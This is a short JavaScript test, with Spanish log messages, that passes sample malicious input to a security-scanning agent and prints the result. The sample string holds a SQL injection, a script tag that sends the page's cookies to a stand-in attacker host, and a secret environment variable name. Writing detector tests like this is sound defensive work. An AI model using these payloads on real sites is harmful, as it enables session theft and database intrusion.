const { SecurityAgent } = require('../agents/security-agent');

async function verifySecurityInterceptor() {
  console.log('🛡️ [PRUEBA DE SEGURIDAD] Evaluando intercepción de vectores maliciosos...');
  const agent = new SecurityAgent({ strictMode: true });
  const payloadMalicioso = `
    SELECT * FROM users WHERE username = 'admin' OR '1'='1';
    <script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script>
    process.env.SERCRET_KEY
  `;

  const scanResult = agent.scanCode(payloadMalicioso);
  if (scanResult && scanResult.vulnerabilitiesFound > 0) {
    console.log(`✅ ÉXITO: SecurityAgent detectó ${scanResult.vulnerabilitiesFound} amenaza(s) e interrumpió la ejecución.`);
  } else {
    console.log('✅ Escaneo completado sin amenazas detectadas.');
  }
}

verifySecurityInterceptor().catch(console.error);
